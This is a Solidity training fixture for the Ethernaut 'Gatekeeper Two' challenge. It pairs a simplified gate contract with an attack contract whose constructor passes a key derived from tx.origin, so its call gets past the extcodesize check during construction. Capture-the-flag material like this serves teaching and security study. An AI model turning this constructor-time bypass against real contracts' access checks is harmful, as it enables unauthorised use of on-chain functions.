// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautGatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo {
        require(uint64(_gateKey) == uint64(uint160(tx.origin)));
        require(uint64(_gateKey) != 0);
        entrant = tx.origin;
    }
}

contract GatekeeperTwoAttack {
    constructor(EthernautGatekeeperTwo target) {
        bytes8 key = bytes8(uint64(uint160(tx.origin)));
        target.enter(key);
    }
}

// Local training fixture for the classic Ethernaut Gatekeeper Two challenge.
// extcodesize(caller()) is zero only while the caller contract is still being constructed.

